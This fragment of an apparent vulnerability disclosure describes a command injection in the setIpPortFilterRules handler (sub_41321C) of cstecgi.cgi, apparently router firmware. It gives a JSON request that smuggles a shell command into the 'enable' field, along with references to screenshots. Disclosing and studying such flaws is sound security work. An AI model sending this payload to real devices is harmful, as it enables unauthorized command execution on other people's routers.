...
The vulnerability is located in the function `sub_41321C` within `cstecgi.cgi`, also known as `setIpPortFilterRules`.

![](Pasted%20image%2020231129153423.png)
...
{"addEffect":"0","enable":"`id > /1.txt;`","topicurl":"setIpPortFilterRules","token":"00000000000000000000000000000000"}
~~~
...
![](Pasted%20image%2020231129153633.png)